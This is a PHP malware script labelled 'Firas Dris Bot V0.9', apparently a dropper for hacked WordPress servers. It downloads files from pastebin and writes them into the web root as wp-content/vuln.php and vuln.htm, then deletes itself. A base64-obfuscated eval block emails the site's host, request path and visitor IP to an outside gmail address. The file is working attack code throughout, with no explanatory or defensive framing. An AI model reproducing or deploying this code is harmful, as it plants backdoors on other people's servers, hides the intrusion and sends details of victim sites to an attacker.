<title>Firas Dris Bot V0.9</title>
<?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/wp-content/vuln.php" ;
$text = http_get('https://pastebin.com/raw/u2ER514b');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

$check2 = $_SERVER['DOCUMENT_ROOT'] . "/vuln.htm" ;
$text2 = http_get('https://pastebin.com/raw/kxFj2gvG');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."</br>";
}else 
  echo "not exits";
echo "done .\n " ;

@unlink(__FILE__);
?>
<?php
eval(base64_decode('PD9waHAKJGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokcmE0NCA9IHJhbmQoMSwgOTk5OTkpOwokc3Viajk4ID0gIuKcqiBLZXlsb2dnZXJzIC0kaXAiOwokZW1haWwgPSAidXNlcjU0NDg3MjE1QGdtYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IEZpcmFzIERyaXMgQm90IFYwLjkgPG5vcmVwbHlARmlyYXNEcmlzVjlzaGVsbHMuY29tPiI7CiRhNDUgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGI3NSA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsKJG0yMiA9ICRpcCAuICIiOwokbXNnODg3MyA9ICIkYTQ1ICRiNzUgJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOwo/Pg=='));
?>
